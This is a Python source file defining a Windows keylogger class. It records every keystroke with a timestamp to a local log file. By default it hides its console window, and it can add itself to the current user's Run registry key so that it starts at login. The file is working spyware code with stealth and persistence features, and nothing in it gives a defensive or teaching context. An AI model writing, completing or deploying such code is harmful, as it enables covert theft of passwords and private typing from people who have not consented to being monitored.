import os
import sys
import ctypes
from datetime import datetime
from pynput import keyboard
import winreg

class KeyLogger:
    def __init__(self, logfile="keylog.txt", silent=True):
        self.logfile = logfile
        self.silent = silent
        self.listener = None
        self.log = ""

    def _on_press(self, key):
        try:
            k = key.char
        except AttributeError:
            k = f"[{key.name}]"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"{timestamp} - {k}\n"
        self.log += entry
        with open(self.logfile, "a") as f:
            f.write(entry)

    def start(self):
        if self.silent:
            self._hide_console()
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()

    def read_log(self):
        if os.path.exists(self.logfile):
            with open(self.logfile, "r") as f:
                return f.read()
        return ""

    def _hide_console(self):
        try:
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
                ctypes.windll.kernel32.CloseHandle(whnd)
        except:
            pass

    def add_to_startup(self, app_name="KeyLogger", script_path=None):
        if script_path is None:
            script_path = os.path.realpath(sys.argv[0])
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            return False
